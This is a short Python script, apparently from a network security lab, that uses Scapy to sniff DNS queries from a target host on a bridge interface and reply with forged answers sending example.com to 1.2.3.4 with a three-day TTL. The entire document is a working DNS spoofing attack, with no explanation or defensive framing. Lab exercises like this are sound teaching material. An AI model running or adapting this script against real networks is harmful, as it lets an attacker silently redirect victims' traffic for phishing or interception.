#!/bin/env python3

from scapy.all import *
import sys

target = sys.argv[1]

def spoof_dns(pkt):
  if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):
    old_ip  = pkt[IP]
    old_udp = pkt[UDP]
    old_dns = pkt[DNS]

    ip  = IP  ( dst   = old_ip.src,     \
                src   = old_ip.dst )

    udp = UDP ( dport = old_udp.sport,  \
                sport = 53  )

    Anssec = DNSRR( rrname = old_dns.qd.qname, \
                    type   = 'A',              \
                    rdata  = '1.2.3.4',        \
                    ttl    = 259200)

    dns = DNS( id = old_dns.id,                   \
               aa=1, qr=1, qdcount=1, ancount=1,  \
               qd = old_dns.qd,                   \
               an = Anssec)

    spoofpkt = ip/udp/dns
    send(spoofpkt)

f = 'udp and (src host {} and dst port 53)'.format(target)
pkt=sniff(iface='br-0a1341e6c3d2', filter=f, prn=spoof_dns)

